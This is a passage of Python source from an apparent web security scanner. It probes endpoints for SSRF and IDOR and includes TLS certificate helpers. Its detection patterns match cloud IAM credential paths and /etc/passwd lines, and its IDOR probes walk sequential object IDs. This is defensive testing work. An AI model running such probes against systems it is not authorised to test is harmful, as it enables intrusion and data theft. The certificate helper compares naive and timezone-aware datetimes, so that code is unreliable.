            ("/api/screenshot/","url",     "GET",  "query"),
            ("/api/pdf/",      "url",      "POST", "json"),
            ("/api/redirect/", "url",      "GET",  "query"),
            ("/api/load/",     "src",      "GET",  "query"),
            ("/api/image/",    "src",      "GET",  "query"),
        ]

        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            ssrf_payloads = ssrf_payloads[: ic["max_payloads"]]

        async with SecurityHTTPClient(config) as client:
            for endpoint, field, method, inject_as in ssrf_targets:
                for ssrf_url, description in ssrf_payloads:
                    test_id = f"{scan_id}-ssrf-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            method, endpoint, ssrf_url,
                            inject_as=inject_as, field_name=field,
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        if code == 404:
                            status = TestStatus.PASSED
                            level = None
                            details = f"SSRF endpoint not found: {endpoint}"
                        elif code == 403 or "blocked" in body:
                            status = TestStatus.BLOCKED
                            level = None
                            details = f"SSRF attempt blocked: {description}"
                        elif any(i in body for i in [
                            "ami-id", "instance-id", "local-ipv4",
                            "iam/security-credentials",
                            "computemetadata", "metadata.google",
                            "root:x:", "daemon:x:",
                            "+ok", "-err",  # Redis
                            "postgresql", "mysql",
                        ]):
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.CRITICAL
                            details = f"SSRF confirmed — internal service response returned: {description}"
                        elif code == 200 and len(body) > 50:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"SSRF possible — URL parameter accepted and returned content: {description}"
                        elif code in (200, 201) and len(body) == 0:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"SSRF possible — URL parameter accepted (blind): {description}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"No SSRF indicator ({code}): {description}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="SSRF",
                        test_name=f"{description} → {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method=method,
                        payload=ssrf_url,
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Validate and allowlist URLs; block private/loopback ranges; disable unused URL schemes; use a dedicated egress proxy",
                    ))

        return results

    # ------------------------------------------------------------------
    # A01 — IDOR (Insecure Direct Object Reference)
    # ------------------------------------------------------------------

    async def _test_idor(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        # Object ID patterns to probe — sequential, UUID, and common values
        id_values = [
            "1", "2", "3", "0", "-1", "99999",
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
            "admin", "root", "system",
        ]

        idor_endpoints = [
            ("/api/users/{id}/",          "GET"),
            ("/api/users/{id}/profile/",  "GET"),
            ("/api/users/{id}/orders/",   "GET"),
            ("/api/orders/{id}/",         "GET"),
            ("/api/invoices/{id}/",       "GET"),
            ("/api/documents/{id}/",      "GET"),
            ("/api/files/{id}/",          "GET"),
            ("/api/messages/{id}/",       "GET"),
            ("/api/accounts/{id}/",       "GET"),
            ("/api/admin/users/{id}/",    "GET"),
        ]

        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            id_values = id_values[: ic["max_payloads"]]

        async with SecurityHTTPClient(config) as client:
            for endpoint_template, method in idor_endpoints:
                for obj_id in id_values:
                    endpoint = endpoint_template.replace("{id}", obj_id)
                    test_id = f"{scan_id}-idor-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(method, endpoint)
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        sensitive = any(k in body for k in [
                            "email", "phone", "address", "password",
                            "token", "secret", "ssn", "credit_card",
                            "date_of_birth", "salary",
                        ])

                        if code in (401, 403):
                            status = TestStatus.PASSED
                            level = None
                            details = f"Access correctly denied ({code}) for object ID: {obj_id}"
                        elif code == 404:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Object not found (404) for ID: {obj_id}"
                        elif code == 200 and sensitive:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"IDOR — sensitive data returned without auth for ID: {obj_id} at {endpoint}"
                        elif code == 200:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"IDOR possible — object accessible without auth for ID: {obj_id} at {endpoint}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Response {code} for ID: {obj_id}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="IDOR",
                        test_name=f"IDOR {method} {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method=method,
                        payload=obj_id,
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Enforce object-level authorization on every endpoint; use indirect references (UUIDs); verify ownership server-side on every request",
                    ))

        return results




    # ------------------------------------------------------------------
    # SSL helper functions (blocking — run in executor)
    # ------------------------------------------------------------------



def _ssl_connect(host: str, port: int, ctx: ssl.SSLContext) -> bool:
    """Attempt TLS handshake; return True if successful."""
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host):
                return True
    except Exception:
        return False


def _get_cert_info(host: str, port: int, ctx: ssl.SSLContext) -> dict:
    """Return certificate metadata dict."""
    with socket.create_connection((host, port), timeout=5) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            cert = ssock.getpeercert()

    not_after_str = cert.get("notAfter", "")
    not_after = (
        datetime.datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z")
        if not_after_str else None
    )
    now = datetime.datetime.now(datetime.timezone.utc).astimezone(__import__("zoneinfo").ZoneInfo("Asia/Kolkata"))
    days_remaining = (not_after - now).days if not_after else None

    issuer = dict(x[0] for x in cert.get("issuer", []))
    subject = dict(x[0] for x in cert.get("subject", []))

    return {
        "not_after": not_after_str,
        "expired": not_after is not None and not_after < now,
        "expiring_soon": days_remaining is not None and days_remaining < 30,
        "days_remaining": days_remaining,
        "self_signed": issuer.get("commonName") == subject.get("commonName"),
        "subject_cn": subject.get("commonName"),
        "issuer_cn": issuer.get("commonName"),
    }


# ------------------------------------------------------------------
# Recommendation helpers
# ------------------------------------------------------------------

def _sqli_recommendation(level) -> Optional[str]:
    if level is None:
        return None
    return (
        "Use parameterised queries / prepared statements; "
        "never concatenate user input into SQL; "
        "apply least-privilege DB accounts; "
        "enable WAF SQL injection rules"
    )
